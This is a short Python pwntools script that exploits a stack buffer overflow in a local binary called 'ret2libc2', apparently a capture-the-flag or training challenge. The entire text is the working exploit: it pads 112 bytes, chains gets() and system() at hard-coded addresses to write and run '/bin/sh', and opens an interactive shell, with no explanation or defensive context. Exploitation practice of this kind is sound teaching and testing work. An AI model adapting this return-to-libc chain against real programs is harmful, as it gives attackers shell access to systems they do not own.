from pwn import *

p = process('./ret2libc2')

system_addr = 0x8048490
gets_addr = 0x8048460
buf2_addr = 0x804a080
payload = b'A' * 112 + p32(gets_addr) + p32(system_addr) + p32(buf2_addr) + p32(buf2_addr)
p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
